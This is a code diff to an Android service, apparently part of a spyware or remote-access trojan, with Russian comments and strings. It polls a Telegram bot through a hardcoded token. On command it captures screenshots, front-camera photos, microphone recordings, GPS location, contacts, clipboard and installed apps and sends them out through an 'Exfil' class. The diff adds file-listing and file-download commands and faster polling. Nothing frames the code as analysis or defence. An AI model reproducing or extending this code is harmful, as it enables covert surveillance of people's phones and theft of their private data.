@@ -16,7 +16,7 @@ public class CommandListener extends Service {
 
     private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
     private static final String OWNER = "8558500657";
-    private static final long INTERVAL = 10000;
+    private static final long INTERVAL = 5000;
     private long lastUpdateId = 0;
     private Handler handler = new Handler(Looper.getMainLooper());
     private boolean running = false;
@@ -25,7 +25,7 @@ public class CommandListener extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (!running) {
             running = true;
-            Exfil.send("CMD", "Listener запущен, жду команды");
+            Exfil.send("CMD", "Listener запущен, готов к командам");
             handler.post(poll);
         }
         return START_STICKY;
@@ -37,7 +37,7 @@ public class CommandListener extends Service {
             new Thread(() -> {
                 try {
                     String url = "https://api.telegram.org/bot" + TOKEN
-                        + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
+                        + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=3";
                     HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                     c.setConnectTimeout(15000);
                     c.setReadTimeout(15000);
@@ -75,7 +75,7 @@ public class CommandListener extends Service {
                         }
                     }
                 } catch (Throwable t) {
-                    // на ошибках поллинга просто ждём
+                    // тихо игнорируем ошибки сети
                 }
                 if (running) handler.postDelayed(poll, INTERVAL);
             }).start();
@@ -86,22 +86,24 @@ public class CommandListener extends Service {
         try {
             if (text.startsWith("/help") || text.startsWith("/start")) {
                 Exfil.send("HELP",
-                    "/screenshot — скрин сейчас\n" +
-                    "/info — статус устройства\n" +
-                    "/apps — список приложений\n" +
-                    "/contacts — контакты\n" +
-                    "/location — GPS\n" +
-                    "/photo — фото фронталка\n" +
+                    "/ping — проверка связи\n" +
+                    "/screenshot — скрин\n" +
+                    "/photo — фронталка\n" +
                     "/mic — запись 20 сек\n" +
-                    "/clip — буфер\n" +
+                    "/location — GPS\n" +
+                    "/info — статус\n" +
+                    "/apps — приложения\n" +
+                    "/contacts — контакты\n" +
                     "/battery — батарея\n" +
+                    "/clip — буфер\n" +
                     "/vibrate — вибрация\n" +
-                    "/ping — тест связи");
+                    "/files <path> — файлы\n" +
+                    "/get <path> — скачать");
                 return;
             }
 
             if (text.startsWith("/ping")) {
-                Exfil.send("CMD", "Pong! Связь работает");
+                Exfil.send("CMD", "Pong! Связь работает ✅");
                 return;
             }
 
@@ -111,60 +113,45 @@ public class CommandListener extends Service {
                     i.setAction("CAPTURE_NOW");
                     startService(i);
                 } catch (Throwable t) {
-                    Exfil.send("CMD", "Ошибка screenshot: " + t.getMessage());
+                    Exfil.send("CMD", "Ошибка скрина: " + t.getMessage());
                 }
                 return;
             }
 
-            if (text.startsWith("/info")) {
-                CommandHandler.sendInfo(this);
-                return;
-            }
-
-            if (text.startsWith("/apps")) {
-                AppList.dump(this);
-                return;
-            }
-
-            if (text.startsWith("/contacts")) {
-                CommandHandler.sendContacts(this);
-                return;
-            }
-
-            if (text.startsWith("/location")) {
-                CommandHandler.sendLocation(this);
-                return;
-            }
-
-            if (text.startsWith("/photo")) {
-                CommandHandler.takePhoto(this);
-                return;
-            }
-
-            if (text.startsWith("/mic")) {
-                CommandHandler.recordMic(this, 20);
-                return;
-            }
-
-            if (text.startsWith("/clip")) {
-                CommandHandler.sendClipboard(this);
-                return;
-            }
-
-            if (text.startsWith("/battery")) {
-                CommandHandler.sendBattery(this);
-                return;
-            }
-
+            if (text.startsWith("/info")) { CommandHandler.sendInfo(this); return; }
+            if (text.startsWith("/apps")) { AppList.dump(this); return; }
+            if (text.startsWith("/contacts")) { CommandHandler.sendContacts(this); return; }
+            if (text.startsWith("/location")) { CommandHandler.sendLocation(this); return; }
+            if (text.startsWith("/photo")) { CommandHandler.takePhoto(this); return; }
+            if (text.startsWith("/mic")) { CommandHandler.recordMic(this, 20); return; }
+            if (text.startsWith("/clip")) { CommandHandler.sendClipboard(this); return; }
+            if (text.startsWith("/battery")) { CommandHandler.sendBattery(this); return; }
             if (text.startsWith("/vibrate")) {
                 CommandHandler.vibrate(this);
                 Exfil.send("CMD", "Вибрация отправлена");
                 return;
             }
 
+            if (text.startsWith("/files")) {
+                String path = text.substring(6).trim();
+                if (path.isEmpty()) path = "/sdcard/";
+                FileManager.listDir(this, path);
+                return;
+            }
+
+            if (text.startsWith("/get")) {
+                String path = text.substring(4).trim();
+                if (path.isEmpty()) {
+                    Exfil.send("CMD", "Использование: /get /sdcard/file.jpg");
+                    return;
+                }
+                FileManager.downloadFile(this, path);
+                return;
+            }
+
             Exfil.send("CMD", "Неизвестная команда: " + text);
         } catch (Throwable t) {
-            Exfil.send("CMD", "Ошибка выполнения: " + t.getMessage());
+            Exfil.send("CMD", "Ошибка: " + t.getMessage());
         }
     }
 
